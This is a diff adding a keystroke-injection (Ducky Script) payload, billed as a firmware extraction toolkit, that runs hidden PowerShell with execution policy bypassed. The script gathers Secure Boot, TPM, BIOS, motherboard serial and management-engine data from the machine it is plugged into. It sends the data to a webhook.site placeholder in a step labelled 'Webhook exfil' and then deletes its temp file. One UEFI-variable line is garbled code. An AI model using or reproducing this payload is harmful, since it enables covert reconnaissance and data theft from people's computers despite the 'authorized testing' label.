@@ -1,0 +1,87 @@
+REM NullSec - Firmware Extraction Toolkit
+REM Extracts UEFI/firmware info, SecureBoot status, TPM data
+REM For security research and authorized testing
+
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+
+STRING $firmware = @{}
+ENTER
+
+REM UEFI Secure Boot status
+STRING $firmware.SecureBoot = @{
+    Enabled = Confirm-SecureBootUEFI -ErrorAction SilentlyContinue
+    Variables = Get-SecureBootUEFI -Name 'SetupMode','SecureBoot' -ErrorAction SilentlyContinue
+}
+ENTER
+DELAY 200
+
+REM TPM Information
+STRING $firmware.TPM = @{
+    Present = (Get-Tpm -ErrorAction SilentlyContinue).TpmPresent
+    Ready = (Get-Tpm -ErrorAction SilentlyContinue).TpmReady
+    Enabled = (Get-Tpm -ErrorAction SilentlyContinue).TpmEnabled
+    Version = (Get-WmiObject -Namespace 'root\cimv2\security\microsofttpm' -Class Win32_Tpm -ErrorAction SilentlyContinue).SpecVersion
+}
+ENTER
+DELAY 200
+
+REM UEFI variables (requires admin)
+STRING try {
+    $firmware.UEFIVars = @{
+        BootOrder = [System.Text.Encoding]::Unicode.GetString([System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Nls\CodePage').ACP))
+    }
+} catch {}
+ENTER
+DELAY 200
+
+REM SMBIOS/DMI data
+STRING $firmware.SMBIOS = @{
+    BIOSVersion = (Get-WmiObject Win32_BIOS).SMBIOSBIOSVersion
+    BIOSReleaseDate = (Get-WmiObject Win32_BIOS).ReleaseDate
+    SystemManufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
+    SystemModel = (Get-WmiObject Win32_ComputerSystem).Model
+    SystemSKU = (Get-WmiObject Win32_ComputerSystem).SystemSKUNumber
+    BaseBoardManufacturer = (Get-WmiObject Win32_BaseBoard).Manufacturer
+    BaseBoardProduct = (Get-WmiObject Win32_BaseBoard).Product
+    BaseBoardSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
+}
+ENTER
+DELAY 300
+
+REM Intel ME/AMD PSP status
+STRING $firmware.ManagementEngine = @{
+    IntelME = Get-WmiObject -Namespace 'root\Intel_ME' -Class '*' -ErrorAction SilentlyContinue | Select __CLASS
+    AMDPsp = Get-WmiObject -Class Win32_PnPEntity | Where-Object {$_.Name -match 'PSP|Platform Security'} | Select Name, Status
+}
+ENTER
+DELAY 200
+
+REM Check for known vulnerable firmware versions
+STRING $firmware.VulnCheck = @{
+    SpectreMeltdown = (Get-SpeculationControlSettings -ErrorAction SilentlyContinue)
+    ThunderboltDMA = (Get-PnpDevice | Where-Object {$_.FriendlyName -match 'Thunderbolt'}).Status
+}
+ENTER
+DELAY 200
+
+REM ACPI tables (limited access from userspace)
+STRING $firmware.ACPI = Get-WmiObject -Namespace 'root\wmi' -Class MSAcpi_ThermalZoneTemperature -ErrorAction SilentlyContinue | Select InstanceName
+ENTER
+DELAY 200
+
+REM Export all firmware data
+STRING $firmware | ConvertTo-Json -Depth 5 | Out-File "$env:TEMP\firmware.json" -Encoding UTF8
+ENTER
+DELAY 200
+
+REM Webhook exfil
+STRING try { Invoke-RestMethod -Uri "https://webhook.site/YOUR-ID" -Method Post -Body ($firmware | ConvertTo-Json -Depth 5) -ContentType "application/json" } catch {}
+ENTER
+DELAY 500
+
+STRING Remove-Item "$env:TEMP\firmware.json" -Force 2>$null; exit
+ENTER
